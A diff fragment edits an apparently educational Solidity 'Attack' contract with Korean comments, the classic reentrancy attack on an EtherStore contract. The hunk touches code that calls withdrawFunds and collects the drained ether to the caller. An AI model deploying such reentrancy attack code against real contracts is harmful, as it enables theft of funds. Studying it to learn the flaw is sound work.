@@ -20,9 +20,9 @@ contract Attack {
         //출금함수 호출
         etherStore.withdrawFunds(1 ether);
     }
-    uint256 balance = payable(address(this)).balance;
+  
     function collectEther() public {
-        msg.sender.transfer(payable(address(this)).balance);
+        payable(msg.sender).transfer((address(this)).balance);
     }
 
     //fallback function(종료시 호출)
